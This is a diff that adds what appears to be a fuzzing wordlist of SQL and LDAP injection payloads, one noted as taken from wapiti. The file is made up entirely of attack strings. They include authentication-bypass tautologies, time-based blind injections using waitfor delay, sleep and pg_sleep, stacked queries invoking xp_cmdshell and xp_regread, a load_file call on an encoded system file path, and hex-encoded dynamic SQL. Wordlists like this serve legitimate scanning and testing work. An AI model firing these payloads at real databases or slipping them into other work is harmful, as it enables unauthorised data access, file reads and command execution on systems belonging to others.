@@ -1,0 +1,87 @@
+;
+'
+; execute immediate 'sel' || 'ect us' || 'er'
+update
+or 0=0 #
+"a"" or 3=3 --"
+ or 'a' = 'a
+or 1=1
+username
+)%20or%20('x'='x
+%20or%201=1
+; execute immediate 'sel' || 'ect us' || 'er'
+benchmark(10000000,MD5(1))#
+update
+";waitfor delay '0:0:__TIME__'--
+1) or pg_sleep(__TIME__)--
+||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+"hi"") or (""a""=""a"
+delete
+like
+" or sleep(__TIME__)#
+pg_sleep(__TIME__)--
+*(|(objectclass=*))
+declare @q nvarchar (200) 0x730065006c00650063 ...
+ or 0=0 #
+insert
+1) or sleep(__TIME__)#
+) or ('a'='a
+; exec xp_regread
+*|
+@var select @var as var into temp end --
+1)) or benchmark(10000000,MD5(1))#
+asc
+(||6)
+"a"" or 3=3--"
+" or benchmark(10000000,MD5(1))#
+# from wapiti
+ or 0=0 --
+1 waitfor delay '0:0:10'--
+ or 'a'='a
+hi or 1=1 --"
+or a = a
+ UNION ALL SELECT
+) or sleep(__TIME__)='
+)) or benchmark(10000000,MD5(1))#
+hi' or 'a'='a
+0
+21 %
+limit
+ or 1=1
+ or 2 > 1
+")) or benchmark(10000000,MD5(1))#
+PRINT
+hi') or ('a'='a
+ or 3=3
+));waitfor delay '0:0:__TIME__'--
+a' waitfor delay '0:0:10'--
+1;(load_file(char(47,101,116,99,47,112,97,115, ...
+or%201=1
+1 or sleep(__TIME__)#
+or 1=1
+ and 1 in (select var from temp)--
+ or '7659'='7659
+ or 'text' = n'text'
+ --
+ or 1=1 or ''='
+declare @s varchar (200) select @s = 0x73656c6 ...
+exec xp
+; exec master..xp_cmdshell 'ping 172.10.1.255'--
+3.10E+17
+" or pg_sleep(__TIME__)--
+x' AND email IS NULL; --
+&
+admin' or '
+ or 'unusual' = 'unusual'
+//
+truncate
+1) or benchmark(10000000,MD5(1))#
+\x27UNION SELECT
+declare @s varchar(200) select @s = 0x77616974 ...
+tz_offset
+sqlvuln
+"));waitfor delay '0:0:__TIME__'--
+||6
+or%201=1 --
+%2A%28%7C%28objectclass%3D%2A%29%29
+or a=a
